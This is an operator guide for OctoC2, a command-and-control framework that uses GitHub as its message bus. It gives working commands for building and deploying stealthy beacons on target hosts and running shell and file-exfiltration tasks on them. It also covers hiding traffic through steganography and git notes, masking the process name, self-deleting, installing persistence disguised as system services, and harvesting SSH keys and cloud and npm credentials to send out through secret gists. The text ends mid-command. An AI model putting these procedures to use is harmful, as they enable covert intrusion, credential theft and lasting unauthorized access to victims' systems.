# OctoC2 — Operator Production Guide

End-to-end workflow for deploying, operating, and hardening an OctoC2 C2 infrastructure against a target GitHub repository.

> **Research / educational use only.** This document describes the operational procedures for the OctoC2 framework.

---

## Table of Contents

1. [Prerequisites](#1-prerequisites)
2. [Initial Setup](#2-initial-setup)
3. [Deploying the C2 Server](#3-deploying-the-c2-server)
4. [Building and Deploying a Beacon](#4-building-and-deploying-a-beacon)
5. [Running the Dashboard](#5-running-the-dashboard)
6. [Operating via octoctl](#6-operating-via-octoctl)
7. [Tentacle Channel Selection](#7-tentacle-channel-selection)
8. [Steganography Channel (T9)](#8-steganography-channel-t9)
9. [OpenHulud OPSEC Hardening](#9-openhulud-opsec-hardening)
10. [E2E Testing](#10-e2e-testing)
11. [OPSEC Checklist](#11-opsec-checklist)
12. [Fingerprint Verification](#12-fingerprint-verification)

---

## 1. Prerequisites

### Runtime

| Requirement | Version | Notes |
|-------------|---------|-------|
| [Bun](https://bun.sh) | ≥ 1.3 | Used everywhere — server, implant, octoctl |
| Node.js / Python | — | Not required; Bun is the only runtime |
| Git | any | Required for git notes and branch tentacle ops |

Install Bun:

```bash
curl -fsSL https://bun.sh/install | bash
bun --version   # verify ≥ 1.3
```

### GitHub PAT Scopes

Create a Personal Access Token (classic) at `https://github.com/settings/tokens`.

#### By deployment role

| Role | Required Scopes | Notes |
|------|----------------|-------|
| **Beacon** (baked at build time) | `repo` | Covers Issues, Branch, Actions Variables, git notes, Secrets, Deployments (T1–T3, T5, T7–T9) |
| **Beacon** + GistTentacle (T6) | `repo`, `gist` | `gist` required for secret gist ACK channel |
| **Beacon** + Codespaces relay (T4) | `repo`, `codespaces` | `codespaces` required to list/connect to Codespaces for gRPC tunnel |
| **Server** (C2 controller) | `repo`, `gist` | `gist` required for GistChannel polling |
| **octoctl** (operator CLI) | `repo`, `gist` | `gist` required for `drop create` dead-drop delivery |
| **octoctl** + proxy creation | `repo`, `gist` | `repo` scope covers user repo creation via `proxy create --create-repo` |
| **Module upload** | `repo`, `write:packages` | GitHub Packages publish for `load-module` tasks |
| **Org-owned C2 repo** | Add `read:org` | Gist API requires `read:org` when the C2 repo is under an org |

#### Minimum configurations

```
Issues-only (no gist channel, no dead-drop):  repo
Standard production (recommended):            repo, gist
Full (all channels including Codespaces T4):  repo, gist, codespaces
```

#### Does PAT scope matter when using GitHub App auth?

**Yes, for the PAT -- no, for the App itself.**

The beacon binary always contains a PAT as a fallback (`OCTOC2_GITHUB_TOKEN`). This PAT is used:
- Before the App key dead-drop is picked up on first check-in
- By octoctl commands (`task`, `results`, `keygen`, `drop create`, `proxy create`)
- Any time App credentials are absent or fail

Once the beacon picks up the App key via dead-drop and switches to App auth, it uses short-lived installation tokens instead of the PAT for all C2 traffic. GitHub App tokens are scoped by **permissions** (not OAuth scopes), so the PAT scopes become irrelevant for beacon communication at that point.

**Practical guidance:**
- The PAT still needs `repo` + `gist` scope because octoctl always uses it
- The PAT is your fallback -- if the App token fails, the beacon retries with the PAT
- Rotate the PAT regularly via `octoctl drop create --new-token` even if using App auth

#### GitHub App permissions (alternative to PAT for beacon C2 traffic)

| Permission | Level | Covers |
|------------|-------|--------|
| Contents | Read & write | BranchTentacle, NotesTentacle, StegoTentacle git operations |
| Issues | Read & write | IssuesTentacle comments, maintenance comment |
| Actions variables | Read & write | ActionsTentacle, SecretsTentacle variable ACK channel |
| Actions | Read & write | ActionsTentacle `repository_dispatch` trigger |
| Deployments | Read & write | PagesTentacle deployment dead-drop |
| Secrets | Read & write | Variables API channel (uses secrets endpoint for encryption key fetch) |
| Gists | Read & write | GistTentacle ACK channel (account-level permission) |

App tokens are scoped to the specific installed repository only. A compromised installation token cannot access any other repo.

### C2 Repository

The C2 repository is the GitHub repo that acts as the message bus. It must be:

- A repository you control (can be private or public — private preferred for OPSEC)
- Enabled for Issues
- Accessible with your PAT

No custom domains, VPS, or external infrastructure required.

### Operator Workstation

```bash
# Clone the OctoC2 source
git clone https://github.com/<your-fork>/OctoC2
cd OctoC2

# Install all workspace dependencies
bun install
```

---

## 2. Initial Setup

### 2.1 Generate an Operator Keypair

The operator keypair is an X25519 key pair used for all beacon-to-server cryptography:

- **Public key** (`MONITORING_PUBKEY`) — baked into beacons; set on the C2 repo as a GitHub Variable
- **Secret key** (`OCTOC2_OPERATOR_SECRET`) — kept only on the operator side; never leaves the workstation

```bash
cd octoctl
bun run src/index.ts keygen
```

Output:

```
OCTOC2_OPERATOR_SECRET=<base64url-secret-key>
OCTOC2_OPERATOR_PUBKEY=<base64url-public-key>
```

Save `OCTOC2_OPERATOR_SECRET` securely (password manager, encrypted vault). This cannot be recovered.

### 2.2 Push Public Key to C2 Repository

```bash
export OCTOC2_GITHUB_TOKEN=<your-PAT>
export OCTOC2_REPO_OWNER=<org-or-username>
export OCTOC2_REPO_NAME=<c2-repo-name>

bun run src/index.ts keygen --set-variable
```

This sets `MONITORING_PUBKEY` as a GitHub Actions Variable on the C2 repo. Beacons fetch this variable on first checkin to verify the operator's public key without needing it baked into the binary.

### 2.3 Export Core Environment Variables

Add to your shell profile or operator `.env` file:

```bash
export OCTOC2_GITHUB_TOKEN=<your-PAT>
export OCTOC2_REPO_OWNER=<org-or-username>
export OCTOC2_REPO_NAME=<c2-repo-name>
export OCTOC2_OPERATOR_SECRET=<base64url-secret-key>
```

All `octoctl` commands and the server require these four variables at minimum.

---

## 3. Deploying the C2 Server

The C2 server polls GitHub for beacon checkins, decrypts task results, and exposes an HTTP API for the dashboard and `octoctl beacon shell`.

### 3.1 Environment Variables Reference

| Variable | Required | Default | Description |
|----------|----------|---------|-------------|
| `OCTOC2_GITHUB_TOKEN` | Yes | — | PAT with `repo` scope |
| `OCTOC2_REPO_OWNER` | Yes | — | GitHub org/user owning the C2 repo |
| `OCTOC2_REPO_NAME` | Yes | — | C2 repository name |
| `OCTOC2_OPERATOR_SECRET` | Yes | — | Base64url X25519 secret key from `keygen` |
| `MONITORING_PUBKEY` | Semi-required | — | Base64url public key (preferred: set as GitHub Variable; this env var is the fallback) |
| `OCTOC2_DATA_DIR` | No | `./data` | Directory for `registry.json` beacon state |
| `OCTOC2_POLL_INTERVAL_MS` | No | `30000` | GitHub Issues poll interval in milliseconds |
| `OCTOC2_GRPC_PORT` | No | `50051` | gRPC listener port (for T4 Codespaces channel) |
| `OCTOC2_GRPC_DISABLED` | No | unset | Set to any value to disable gRPC listener |
| `OCTOC2_HTTP_PORT` | No | `8080` | Dashboard HTTP API port |
| `OCTOC2_HTTP_DISABLED` | No | unset | Set to any value to disable HTTP API |

### 3.2 Start Locally

```bash
cd server
bun run src/index.ts
```

The server will:
1. Load operator keys and initialize the beacon registry
2. Start polling GitHub Issues every 30 seconds
3. Listen for gRPC on port 50051
4. Start the Dashboard HTTP API on port 8080

### 3.3 Start in a GitHub Codespace (recommended for production)

Running the server in a Codespace keeps operator infrastructure inside GitHub's network, minimising external exposure:

```bash
# In Codespace terminal:
export OCTOC2_GITHUB_TOKEN=<pat>
export OCTOC2_REPO_OWNER=<owner>
export OCTOC2_REPO_NAME=<repo>
export OCTOC2_OPERATOR_SECRET=<secret>

cd /workspaces/OctoC2/server
bun run src/index.ts
```

Forward port 8080 via Codespace port forwarding for dashboard access. The gRPC port (50051) is used by the GrpcSshTentacle over the Codespace SSH tunnel — no additional forwarding needed.

### 3.4 Data Directory

The server writes `registry.json` to `OCTOC2_DATA_DIR` (default: `./data` relative to CWD). This file tracks all registered beacons. Back it up regularly.

```bash
# Override data directory
OCTOC2_DATA_DIR=/var/lib/octoc2 bun run src/index.ts
```

---

## 4. Building and Deploying a Beacon

### 4.1 Beacon Environment Variables

These are baked into the binary at compile time via `--define`. Runtime env vars override baked values.

| Variable | Baked | Runtime | Description |
|----------|-------|---------|-------------|
| `OCTOC2_GITHUB_TOKEN` | Yes | Yes | PAT for the C2 repo (runtime overrides baked) |
| `OCTOC2_REPO_OWNER` | Yes | Yes | C2 repo owner |
| `OCTOC2_REPO_NAME` | Yes | Yes | C2 repo name |
| `OCTOC2_BEACON_ID` | Yes | Yes | Stable beacon UUID (generated if absent) |
| `OCTOC2_BEACON_PUBKEY` | Yes | — | Beacon X25519 public key (baked) |
| `OCTOC2_BEACON_SECKEY` | Yes | — | Beacon X25519 secret key (baked) |
| `OCTOC2_SLEEP` | No | Yes | Base sleep interval in seconds (default: 60) |
| `OCTOC2_JITTER` | No | Yes | Jitter factor 0–1 (default: 0.3) |
| `OCTOC2_LOG_LEVEL` | No | Yes | `debug` / `info` / `warn` / `error` (default: `info`) |
| `OCTOC2_TENTACLE_PRIORITY` | No | Yes | Comma-separated channel priority (default: `issues,codespaces`) |
| `OCTOC2_CLEANUP_DAYS` | No | Yes | Days to keep result comments (default: no cleanup; `0` = immediate) |
| `OCTOC2_PROXY_REPOS` | Yes | Yes | JSON array of proxy repo configs |
| `OCTOC2_APP_ID` | Yes | Yes | GitHub App numeric ID (optional; App auth path) |
| `OCTOC2_INSTALLATION_ID` | Yes | Yes | GitHub App installation ID (optional) |
| `OCTOC2_APP_PRIVATE_KEY` | No | Yes | RSA PEM key — never baked; deliver via dead-drop |

### 4.2 Build via octoctl (Recommended)

`octoctl build-beacon` compiles the implant with a freshly-generated X25519 keypair baked in. The beacon ID and crypto keys are generated at build time and registered with the server on first checkin.

```bash
cd /path/to/OctoC2

# Minimal build (PAT auth)
bun run octoctl/src/index.ts build-beacon \
  --outfile ./beacon-prod

# Build with custom sleep interval
bun run octoctl/src/index.ts build-beacon \
  --outfile ./beacon-prod \
  --env "OCTOC2_SLEEP=120" \
  --env "OCTOC2_JITTER=0.4"

# Build with relay consortium (OctoProxy channels)
bun run octoctl/src/index.ts build-beacon \
  --outfile ./beacon-prod \
  --relay acme/infra-utils \
  --relay acme/build-tools

# Build with HTTP/WebSocket channel (T11) — works through Dev Tunnels
# Use when gRPC is unavailable (Dev Tunnels only supports HTTP/1.1 for backends)
bun run octoctl/src/index.ts build-beacon \
  --outfile ./beacon-prod \
  --http-url "https://<codespace-name>-8080.app.github.dev" \
  --tentacle-priority "http,issues"
```

### 4.3 Build via Makefile (GitHub App auth)

For GitHub App authentication (recommended for production — 1-hour rotating tokens):

```bash
# Step 1: Create a GitHub App, get App ID and Installation ID
# Step 2: Build the beacon with App ID baked in
export OCTOC2_APP_ID=123456
export OCTOC2_INSTALLATION_ID=987654

make agent-app
# Outputs: beacon-agent-app

# Step 3: Deliver the private key via encrypted dead-drop (never bake it)
bun run octoctl/src/index.ts drop create \
  --beacon <beacon-id-prefix> \
  --app-key-file ~/.config/octoc2/app-key.pem
```

### 4.4 Deploy to Target

Transfer the beacon binary to the target host via your preferred delivery method. On first run, the beacon:

1. Generates or loads a stable UUID from `~/.config/octoc2/`
2. Registers with the C2 repo by creating a GitHub Issue titled `Scheduled maintenance · <shortId>`
3. Posts an encrypted checkin comment
4. Enters the main loop: poll → execute tasks → submit results → sleep

```bash
# On target — run in background
nohup ./beacon-prod &>/dev/null &

# Or with custom interval
OCTOC2_SLEEP=300 OCTOC2_JITTER=0.2 nohup ./beacon-prod &>/dev/null &
```

### 4.5 Dead-Drop Recovery

To rotate credentials or deliver runtime config to an already-deployed beacon:

```bash
# Rotate PAT token
bun run octoctl/src/index.ts drop create \
  --beacon <beacon-id-prefix> \
  --new-token <new-github-pat>

# Change C2 server URL and tentacle priority
bun run octoctl/src/index.ts drop create \
  --beacon <beacon-id-prefix> \
  --server-url https://backup-c2:8080 \
  --tentacle-priority notes,issues

# Deliver initial GitHub App private key (at first deploy)
bun run octoctl/src/index.ts drop create \
  --beacon <beacon-id-prefix> \
  --app-key-file ~/.config/octoc2/app-key.pem

# Rotate GitHub App key explicitly (--key-type app)
bun run octoctl/src/index.ts drop create \
  --beacon <beacon-id-prefix> \
  --key-type app \
  --app-key-file ~/.config/octoc2/new-app-key.pem

# Migrate from PAT to GitHub App auth (full rotation)
bun run octoctl/src/index.ts drop create \
  --beacon <beacon-id-prefix> \
  --app-id 123456 \
  --installation-id 987654 \
  --app-key-file ~/.config/octoc2/new-app-key.pem

# Rotate operator monitoring public key (X25519 key rotation)
bun run octoctl/src/index.ts drop create \
  --beacon <beacon-id-prefix> \
  --key-type monitoring \
  --monitoring-pubkey <base64url-new-pubkey>

# List existing dead-drops
bun run octoctl/src/index.ts drop list --beacon <beacon-id-prefix>
```

`--key-type` is optional. When omitted the payload type is inferred from the flags provided (`--app-key-file` → app, `--monitoring-pubkey` → monitoring, etc.). Use `--key-type` to be explicit or to prevent accidental field inclusion.

---

## 5. Running the Dashboard

The React operator dashboard provides a real-time UI for beacon management, task queuing, and result viewing.

### 5.1 Local Development Mode

```bash
cd dashboard
bun install   # first time only

# Start dev server with proxy to local C2 server
bun run dev
# Dashboard: http://localhost:5173
# API proxy: /api → http://localhost:8080
```

The dev server proxies all `/api` requests to the C2 server (port 8080). Start the C2 server first.

### 5.2 Production Build

```bash
cd dashboard
bun run build
# Output: dashboard/dist/
```

The production build disables source maps for OPSEC. Build is ~1.3 MB JS / 28 KB CSS.

### 5.3 GitHub Pages Deployment

The dashboard can be hosted on GitHub Pages, keeping operator infrastructure entirely within GitHub:

```bash
cd dashboard

# Build with GitHub Pages base path
VITE_BASE_URL=/your-repo-name/ bun run build

# CI/CD: .github/workflows/deploy-dashboard.yml triggers automatically on push to main
# touching dashboard/**
```

Configure the login screen API endpoint to point at your C2 server URL (Codespace forwarded URL) at login time — no rebuild required.

### 5.4 Dashboard Features

| Feature | Location | Notes |
|---------|----------|-------|
| Beacon list + status | `/` | SSE real-time auto-refresh; sortable columns |
| Beacon detail + results | `/beacon/:id` | Tab: Overview / Tasks / Results / Maintenance |
| Tentacle health grid | Beacon detail → Overview | Live channel status with pulsing green dot |
| Task queue | `/tasks` | Filter by kind/status; cancel pending tasks |
| Multi-beacon results | `/results?beacons=id1,id2` | Aggregate view; linked from BulkActionBar "View Results" |
| Bulk actions | BeaconTable multi-select | Shell, persist, openhulud, stego — confirm dialogs |
| Cmd/Ctrl+K search | Any page | Fast beacon search by ID/hostname/OS |
| Settings + keypair gen | `/settings` | Generate X25519 keypair; safety checklist |
| Maintenance diagnostic | Beacon detail → Maintenance | Auto-decrypts with operator privkey; pretty JSON |
| Copy All Decrypted | Beacon detail → Results | Copies all outputs joined by `---` |
| SSE events | All pages | Real-time beacon/task updates without polling |

---

## 6. Operating via octoctl

`octoctl` is the primary terminal interface for operator actions. All commands require the four core environment variables to be set.

### 6.1 List Beacons

```bash
# All beacons
bun run octoctl/src/index.ts beacons

# Filter by status
bun run octoctl/src/index.ts beacons --status active
bun run octoctl/src/index.ts beacons --status dormant

# JSON output (for scripting)
bun run octoctl/src/index.ts beacons --json
```

### 6.2 Queue Tasks

```bash
# Shell command
bun run octoctl/src/index.ts task <beaconId> --kind shell --cmd "id"

# Execute binary directly (no shell wrapper)
bun run octoctl/src/index.ts task <beaconId> --kind exec --cmd "/usr/bin/uname" --cmd-args "-a"

# Download file from beacon
bun run octoctl/src/index.ts task <beaconId> --kind download --remote-path /etc/passwd

# Upload file to beacon
bun run octoctl/src/index.ts task <beaconId> --kind upload \
  --local-path ./payload.sh --remote-path /tmp/run.sh

# Sleep directive (update beacon interval)
bun run octoctl/src/index.ts task <beaconId> --kind sleep --seconds 600

# Kill beacon
bun run octoctl/src/index.ts task <beaconId> --kind die

# Ping (connectivity probe)
bun run octoctl/src/index.ts task <beaconId> --kind ping

# Force delivery via specific channel
bun run octoctl/src/index.ts task <beaconId> --kind shell --cmd "whoami" --tentacle notes
bun run octoctl/src/index.ts task <beaconId> --kind shell --cmd "id" --tentacle gist
```

#### Task Kinds Reference

| Kind | Description | Key Arguments |
|------|-------------|---------------|
| `shell` | Run command via `/bin/sh -c` | `--cmd <command>` |
| `exec` | Run binary directly (no shell) | `--cmd <binary>` |
| `ping` | Connectivity probe + metadata | — |
| `sleep` | Update beacon sleep interval | `--seconds <n>` |
| `die` / `kill` | Self-terminate beacon | — |
| `download` | Exfil file from target | `--remote-path <path>` |
| `upload` | Drop file on target | `--local-path <path>` `--remote-path <path>` |
| `screenshot` | Capture screen (stub) | — |
| `keylog_start` | Start keylogger (stub) | — |
| `keylog_stop` | Stop keylogger (stub) | — |
| `load-module` | Fetch and execute capability module | `--args-json <json>` |
| `evasion` | OpenHulud evasion action | `--args-json <json>` |

### 6.3 Fetch Task Results

```bash
# Recent results
bun run octoctl/src/index.ts results <beaconId>

# Last 5 results
bun run octoctl/src/index.ts results <beaconId> --last 5

# Results from last 2 hours
bun run octoctl/src/index.ts results <beaconId> --since 2h

# JSON output
bun run octoctl/src/index.ts results <beaconId> --json
```

### 6.4 Interactive Shell REPL

`octoctl beacon shell` provides a readline REPL that queues `shell` tasks and polls for results:

```bash
# Start interactive session (requires C2 server to be running)
OCTOC2_SERVER_URL=http://localhost:8080 \
  bun run octoctl/src/index.ts beacon shell --beacon <beacon-id-prefix>

# Force task delivery via specific channel
OCTOC2_SERVER_URL=http://localhost:8080 \
  bun run octoctl/src/index.ts beacon shell --beacon <beacon-id-prefix> --tentacle notes

# Custom result timeout
OCTOC2_SERVER_URL=http://localhost:8080 \
  bun run octoctl/src/index.ts beacon shell --beacon <beacon-id-prefix> --timeout 120
```

Inside the REPL, type shell commands at the `>` prompt. Results are displayed as they arrive. Type `exit` or press `Ctrl+D` to quit.

### 6.5 Bulk Operations

Queue the same task across multiple beacons in a single command:

```bash
# Fan-out shell command to multiple beacons (fire-and-forget)
bun run octoctl/src/index.ts bulk shell \
  --beacon-ids abc123,def456,ghi789 \
  --cmd "hostname"

# With tentacle override
bun run octoctl/src/index.ts bulk shell \
  --beacon-ids abc123,def456 \
  --cmd "id" \
  --tentacle notes

# Via dashboard BulkActionBar (UI)
# 1. Check multiple rows in BeaconTable
# 2. BulkActionBar appears at bottom
# 3. Choose: shell / persist / openhulud / stego
# 4. Confirm dialog → tasks queued on all selected beacons

# After bulk shell, view aggregate results in dashboard:
# /results?beacons=abc123,def456,ghi789
# Or click "View Results" in BulkActionBar after selecting beacons
```

### 6.6 Tentacle Health

```bash
# Inspect channel health for a beacon
bun run octoctl/src/index.ts tentacles list --beacon <beacon-id-prefix>

# JSON output
bun run octoctl/src/index.ts tentacles list --beacon <beacon-id-prefix> --json

# Live data from running server
bun run octoctl/src/index.ts tentacles list --beacon <beacon-id-prefix> \
  --server-url http://localhost:8080
```

---

## 7. Tentacle Channel Selection

OctoC2 has 11 tentacle channels. The beacon tries channels in `OCTOC2_TENTACLE_PRIORITY` order, falling back automatically on failure.

### Channel Reference

| # | Kind | Mechanism | OPSEC | Visibility | When to Use |
|---|------|-----------|-------|-----------|-------------|
| 1 | `issues` | Encrypted issue comments, edit-in-place heartbeat | High | GitHub web UI (as maintenance notes) | Default primary; always enable |
| 2 | `branch` | File dead-drop on `refs/heads/infra-sync-{id8}` | Medium | Branch list visible | Reliable fallback; invisible content |
| 3 | `actions` | `repository_dispatch` + Variables API ACK | Medium | Actions log visible | High bandwidth; short-lived ACKs |
| 4 | `codespaces` | gRPC over SSH tunnel | High | No GitHub trace | Low-latency tasks in Codespace environments |
| 5 | `pages` | GitHub Deployments API dead-drop, `octoc2-{id8}` env names | Medium | Deployments tab | Passive read channel; no write needed |
| 6 | `gist` | Secret gists `octoc2-a-{id8}.json` | High | Private gists only | Best for covert ACK; not visible in repo |
| 7 | `secrets` | Variables API `INFRA_CFG_{id8}` | Medium | Repo settings (variables) | Config delivery; ACK out-of-band |
| 8 | `notes` | `refs/notes/octoc2-*` git blobs | Very High | Not shown in web UI | Maximum stealth; invisible to most tooling |
| 9 | `stego` | LSB alpha-channel PNG via `refs/heads/infra-cache-{id8}` | Very High | PNG files look benign | Highest stealth; binary payload in images |
| 10 | `proxy` | Decoy repo + GitHub Actions relay | High | Separate repo | Burns decoy repo; best for attribution separation |
| 11 | `http` | WebSocket (`/ws`) primary + REST fallback over HTTP/1.1 | Medium | HTTPS traffic to Codespace | Works through Dev Tunnels; reliable bootstrap |

### OPSEC Tradeoffs

**Use `issues` (T1) for:** Normal operations. The heartbeat comment is edited in-place — only one comment per beacon exists at any time. Issue title is `Scheduled maintenance · <shortId>` with no labels.

**Use `notes` (T8) for:** Maximum stealth operations. `refs/notes/octoc2-*` blobs do not appear in the GitHub web UI. Invisible to operators reviewing the repository.

**Use `stego` (T9) for:** Highest-stealth payload delivery. PNG images committed to `infra-cache-{id8}` branches are binary files that appear completely benign. Payloads are hidden in LSB alpha-channel pixels.

**Use `gist` (T6) for:** ACK channels when the C2 repo is under scrutiny. Secret gists are not linked to the repo and are not visible unless you know the gist ID.

**Use `proxy` (T10) for:** Attribution separation. Traffic appears to originate from a different, unrelated repository. Burns the decoy repo if discovered.

**Use `codespaces` (T4) for:** Low-latency, long-running sessions. gRPC over SSH tunnel provides a persistent bidirectional channel when the operator is running a Codespace.

**Use `http` (T11) for:** Reliable bootstrap when Dev Tunnels is the only available egress. WebSocket over HTTP/1.1 works through GitHub's Dev Tunnels proxy (unlike raw gRPC which requires H2C end-to-end). Bake with `--http-url` + `--tentacle-priority "codespaces,http,issues"` so it acts as a gRPC fallback.

### Setting Tentacle Priority

```bash
# Primary: git notes, fallback: issues
OCTOC2_TENTACLE_PRIORITY=notes,issues

# Stego primary, notes fallback, issues last resort
OCTOC2_TENTACLE_PRIORITY=stego,notes,issues

# Proxy as primary (decoy repo)
OCTOC2_TENTACLE_PRIORITY=proxy,issues

# Gist ACK + issues primary
OCTOC2_TENTACLE_PRIORITY=gist,issues

# HTTP/WebSocket via Codespace public URL, fall back to issues
# (best when Dev Tunnels is the only egress — bake with --http-url)
OCTOC2_TENTACLE_PRIORITY=http,issues
```

---

## 8. Steganography Channel (T9)

The SteganographyTentacle hides encrypted C2 payloads inside PNG images using LSB (Least Significant Bit) alpha-channel steganography.

### How It Works

1. The beacon generates a 1×1 or minimal PNG file
2. The `StegoCodec` encodes the ciphertext into the alpha-channel LSBs of PNG pixels
3. The PNG is committed to a dedicated branch via git blob API (as a binary blob, base64-encoded)
4. The server (or operator) retrieves the branch, decodes the PNG, and extracts the hidden payload

No external tooling required — the codec is pure TypeScript using `PngEncoder`.

### Branch and File Layout

| Artifact | Name | Purpose |
|----------|------|---------|
| Branch | `refs/heads/infra-cache-{id8}` | Dedicated per-beacon branch |
| ACK file | `infra-{id8}-a.png` | Beacon registration payload |
| Task file | `infra-{id8}-t.png` | Encrypted task array |
| Result file | `infra-{id8}-r.png` | Sealed task result |

### When to Use

- Target environment has monitoring on issue comments or branch text files
- Maximum stealth required — PNG images are indistinguishable from normal assets
- Long-term persistent access where channel rotation hygiene is critical

### What the Channel Creates and Deletes

**Creates:**
- Branch `refs/heads/infra-cache-{id8}` on first checkin
- PNG files committed to the branch on each checkin cycle

**Does not auto-delete:**
- The infra-cache branch persists until manually pruned or until `OCTOC2_CLEANUP_DAYS` triggers a prune (if the server implements stego cleanup)

**Manual cleanup:**
```bash
# Delete the infra-cache branch
gh api repos/<owner>/<repo>/git/refs/heads/infra-cache-<id8> -X DELETE
```

### Enable Stego Channel

```bash
# Build beacon with stego as primary channel
bun run octoctl/src/index.ts build-beacon \
  --outfile ./beacon-stego \
  --env "OCTOC2_TENTACLE_PRIORITY=stego,notes,issues"

# Test stego channel
bun run scripts/test-end-to-end.ts --stego --cleanup
```

---

## 9. OpenHulud OPSEC Hardening

OpenHulud is the beacon's evasion module, invoked via `evasion` tasks. All actions are best-effort and log errors without crashing.

### Evasion Actions

Queue evasion tasks via `octoctl task --kind evasion --args-json <json>`:

```bash
# Template
bun run octoctl/src/index.ts task <beaconId> \
  --kind evasion \
  --args-json '{"action":"<action>", ...}'
```

| Action | Description | Additional Args |
|--------|-------------|-----------------|
| `hide` | Mask process name. Writes to `/proc/self/comm` on Linux; sets `process.title` on all platforms | `"name":"systemd-journal"` (optional) |
| `anti_debug` | Detect ptrace / `LD_PRELOAD` debugger presence; logs result in evasion state | — |
| `sleep` | Jittered delay — base delay plus random jitter to randomise timing | `"baseMs":5000, "jitter":0.3` |
| `self_delete` | Unlink own binary from filesystem (best-effort; process continues) | — |
| `status` | Return current evasion state (hidden, debugDetected, selfDeleted, persistence) | — |
| `persist` | Install persistence mechanism | `"method":"auto"` (see below) |
| `propagate` | Scan env/filesystem for credentials and exfil via secret gist | `"token":"<github-pat>"` |

### Persistence Methods

| Method | Platform | Mechanism |
|--------|----------|-----------|
| `auto` | All | Platform detection: crontab (Linux), launchd (macOS), registry (Windows) |
| `crontab` | Linux | Adds `@reboot` crontab entry via `crontab -l` + `crontab -` |
| `launchd` | macOS | Writes `~/Library/LaunchAgents/com.apple.system-update.plist` |
| `registry` | Windows | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` via `reg add` |
| `gh-runner` | Linux/macOS | Registers as a GitHub Actions self-hosted runner |
| `gh-runner-register` | Linux/macOS | Full runner install + register + start as service |

```bash
# Auto-select persistence method
bun run octoctl/src/index.ts task <beaconId> \
  --kind evasion \
  --args-json '{"action":"persist","method":"auto"}'

# Force crontab
bun run octoctl/src/index.ts task <beaconId> \
  --kind evasion \
  --args-json '{"action":"persist","method":"crontab"}'

# GitHub Actions runner registration
bun run octoctl/src/index.ts task <beaconId> \
  --kind evasion \
  --args-json '{"action":"persist","method":"gh-runner-register"}'
```

### Credential Propagation

`propagate` scans for credentials across 7 techniques and exfils via a secret GitHub gist:

| Technique | Source |
|-----------|--------|
| `env-scan` | `GITHUB_TOKEN`, `GH_TOKEN`, `OCTOC2_*` env vars |
| `env-all` | All env vars matching token patterns |
| `ssh-keys` | `~/.ssh/id_*` private key files |
| `aws-credentials` | `~/.aws/credentials` (`aws_access_key_id`, `aws_secret_access_key`) |
| `npmrc-scan` | `~/.npmrc` auth tokens |
| `gcloud-adc` | `~/.config/gcloud/application_default_credentials.json` |
| `azure-tokens` | `~/.azure/accessTokens.json` |

Exfil destination: a secret GitHub gist (not linked to the C2 repo). The gist URL is returned in the task result.

```bash
# Trigger propagation with a token that can create gists
bun run octoctl/src/index.ts task <beaconId> \
  --kind evasion \
  --args-json '{"action":"propagate","token":"<github-pat-with-gist-scope>"}'

# Dry run (empty token — scans but does not exfil)
bun run octoctl/src/index.ts task <beaconId> \
  --kind evasion \
  --args-json '{"action":"propagate","token":""}'
```

### Recommended Hardening Sequence

After beacon deployment, apply in order:

```bash
ID=<beaconId>
BASE="bun run octoctl/src/index.ts task $ID --kind evasion --args-json"

# 1. Mask process name
$BASE '{"action":"hide","name":"systemd-journal"}'

# 2. Detect debugging (check status after)
$BASE '{"action":"anti_debug"}'

# 3. Install persistence
$BASE '{"action":"persist","method":"auto"}'

# 4. Check evasion state
$BASE '{"action":"status"}'

# 5. Scan and exfil credentials (if target has tokens of interest)
$BASE '{"action":"propagate","token":"<target-env-token-if-found>"}'

# 6. Self-delete binary (after persistence is confirmed)
$BASE '{"action":"self_delete"}'
```

---

## 10. E2E Testing

The E2E test script (`scripts/test-end-to-end.ts`) exercises the full beacon ↔ server ↔ octoctl wire protocol against the real GitHub API.

### Prerequisites

```bash
export OCTOC2_GITHUB_TOKEN=<PAT with repo scope>
export OCTOC2_REPO_OWNER=<your-org-or-username>
export OCTOC2_REPO_NAME=<your-test-c2-repo>
export OCTOC2_OPERATOR_SECRET=<base64url secret from keygen>
```

The test uses isolated temp directories — it never touches your production registry.

### Running Tests

```bash
# Basic run (creates issue, queues shell/exec/ping tasks, asserts results)
bun run scripts/test-end-to-end.ts

# Auto-cleanup beacon issue when done
bun run scripts/test-end-to-end.ts --cleanup
```

### Flag Reference

| Flag | Description |
|------|-------------|
| `--cleanup` | Close the beacon issue and strip `status:active` label after run |
| `--grpc` | Spawn local gRPC test server; configure beacon in `GRPC_DIRECT` mode |
| `--proxy` | Route beacon checkins through OctoProxy relay (uses same C2 repo as proxy target) |
| `--notes` | Set `OCTOC2_TENTACLE_PRIORITY=notes,issues` — test git notes channel (T8) |
| `--gist` | Set priority to `gist,issues` — test secret gist channel (T6) |
| `--branch` | Set priority to `branch,issues` — test branch dead-drop channel (T2) |
| `--actions` | Set priority to `actions,issues` — test Actions + Variables API channel (T3) |
| `--secrets` | Set priority to `secrets,issues` — test Variables API covert channel (T7) |
| `--stego` | Set priority to `stego,issues` — test LSB PNG steganography channel (T9) |
| `--pages` | Set priority to `pages,issues` — test Deployments API dead-drop channel (T5) |
| `--oidc` | Include `oidc` in priority — OIDC channel (requires GHA context; warns locally) |
| `--app-key` | Test GitHub App installation-token auth path (requires `OCTOC2_APP_ID`, `OCTOC2_INSTALLATION_ID`, `OCTOC2_APP_PRIVATE_KEY`) |
| `--pat` | Document PAT auth path (no-op when used alone; validates fallback when combined with `--app-key`) |
| `--test-cleanup` | Set `OCTOC2_CLEANUP_DAYS=0`; assert result comments are pruned after next checkin |
| `--maintenance` | Wait for maintenance session comment; assert content and verify only one exists |
| `--openhulud` | Queue evasion tasks (hide/anti_debug/persist/propagate); assert all return success |
| `--bulk` | Queue a `shell` task via direct API POST (simulates `octoctl bulk shell`); assert whoami output |
| `--fingerprint` | Verify OPSEC commit message hygiene — no `octoc2` keywords in commit messages |
| `--web-ui` | Spin up a local live monitor at `http://localhost:8999` (no auth) — shows test progress, beacons, diagnostics |

### Common Flag Combinations

```bash
# Test all non-gRPC channels in one run
bun run scripts/test-end-to-end.ts \
  --notes --gist --branch --actions --secrets --stego --pages --cleanup

# Full OPSEC fingerprint check
bun run scripts/test-end-to-end.ts --stego --branch --fingerprint --cleanup

# Test GitHub App auth path
bun run scripts/test-end-to-end.ts --app-key --cleanup

# Test proxy tentacle
bun run scripts/test-end-to-end.ts --proxy --cleanup

# Verify comment cleanup
bun run scripts/test-end-to-end.ts --test-cleanup --cleanup

# Everything
bun run scripts/test-end-to-end.ts \
